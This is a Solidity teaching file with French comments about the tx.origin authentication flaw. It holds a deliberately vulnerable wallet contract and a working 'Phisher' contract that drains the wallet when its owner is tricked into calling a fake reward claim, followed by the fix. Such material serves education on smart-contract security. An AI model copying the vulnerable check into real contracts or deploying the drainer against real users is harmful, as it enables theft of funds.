// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * VULNERABILITE #3 : AUTHENTIFICATION VIA tx.origin
 *
 * tx.origin = adresse qui a initié la transaction (toujours EOA).
 * msg.sender = appelant direct (EOA OU contrat).
 *
 * Si un contrat utilise tx.origin pour l'auth, un attaquant peut piéger
 * la victime à interagir avec un contrat malicieux qui rappellera la
 * fonction protégée : tx.origin restera la victime.
 */
contract VulnerableWallet {
    address public owner;

    constructor() { owner = msg.sender; }

    function deposit() external payable {}

    /**
     * BUG : tx.origin au lieu de msg.sender.
     */
    function transfer(address payable _to, uint256 _amount) external {
        require(tx.origin == owner, "Not owner"); // <-- VULNERABLE
        (bool ok, ) = _to.call{value: _amount}("");
        require(ok, "Transfer failed");
    }
}

// ========== Phishing contract ==========
contract Phisher {
    VulnerableWallet public target;
    address payable public attackerAddr;

    constructor(VulnerableWallet _target) {
        target = _target;
        attackerAddr = payable(msg.sender);
    }

    /**
     * L'attaquant convainc la victime (owner du wallet) d'appeler "claimReward"
     * sur ce contrat (par ex via une dApp d'apparence légitime, un airdrop, etc.).
     * Quand victim.call -> phisher.claimReward, tx.origin = victime, msg.sender = phisher.
     * On rappele target.transfer : tx.origin = victime = owner du wallet => ça passe !
     */
    function claimReward() external {
        target.transfer(attackerAddr, address(target).balance);
    }
}

/**
 * Scénario :
 *  1. owner du VulnerableWallet a 100 ETH dedans.
 *  2. owner clique sur "Réclamer votre airdrop" sur un site malveillant
 *     -> appelle Phisher.claimReward().
 *  3. Phisher rappele VulnerableWallet.transfer(attacker, 100 ETH).
 *  4. require(tx.origin == owner) PASSE car la transaction a été initiée par owner.
 *  5. Les fonds partent à l'attaquant.
 *
 * Correction : utiliser msg.sender. tx.origin doit être réservé aux logs ou
 * éventuellement à protéger contre les appels DE contrats (rare).
 */
